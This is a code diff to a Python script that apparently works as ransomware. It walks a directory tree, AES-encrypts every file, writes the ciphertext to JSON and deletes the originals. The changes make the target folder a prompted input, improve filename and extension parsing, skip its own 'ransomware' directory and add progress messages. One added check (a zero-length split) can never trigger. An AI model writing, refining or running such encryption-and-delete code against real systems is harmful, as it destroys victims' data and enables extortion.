@@ -1,7 +1,7 @@
 from base64 import b64encode, b64decode
 import encryption, constants, os, json, cryptools, sys
 
-target_folder = 'HACKED_FOLDER'
+target_folder = input('[*] Input Path To Root Directory To Start Encrypting: ')
 
 def main():
 
@@ -25,13 +25,19 @@ def EncryptFolder(folder_path):
 
 	for current_directory, sub_directories, sub_files in os.walk(folder_path):
 
+		if 'ransomware' in current_directory.lower():
+			continue
+
 		for file in sub_files:
+
+			if len(file.split('.')) == 0:
+				continue
 
 			json_dict = dict()
 
-			ext = file.split('.')[1]
+			ext = file.split('.')[-1]
 
-			fileName = file.split('.')[0]
+			fileName = ''.join(file.split('.')[:-1])
 
 			aes_key = os.urandom(constants.AES_KEY_LENGTH)
 
@@ -59,6 +65,7 @@ def EncryptFolder(folder_path):
 				json.dump(json_dict, json_file)
 
 			os.remove(os.path.join(current_directory, file))
+			print('\n[+] Encrypting %s\n' % os.path.join(current_directory, file))
 
 
 def DecryptFolder(folder_path):
@@ -73,7 +80,7 @@ def DecryptFolder(folder_path):
 			with open(os.path.join(current_directory, file), 'r') as js:
 				json_dict = json.load(js)
 
-			fileName = file.split('.')[0]
+			fileName = ''.join(file.split('.')[:-1])
 
 			tag = b64decode(json_dict['TAG'])
 
@@ -96,6 +103,8 @@ def DecryptFolder(folder_path):
 
 			with open(os.path.join(current_directory, fileName + '.' + ext), 'wb') as f:
 				f.write(aes_cipher.Decrypt(ciphertext))
+
+			print('\n[+] Decrypting %s\n' % os.path.join(current_directory, fileName + '.' + ext))
 
 			os.remove(os.path.join(current_directory, file))
 
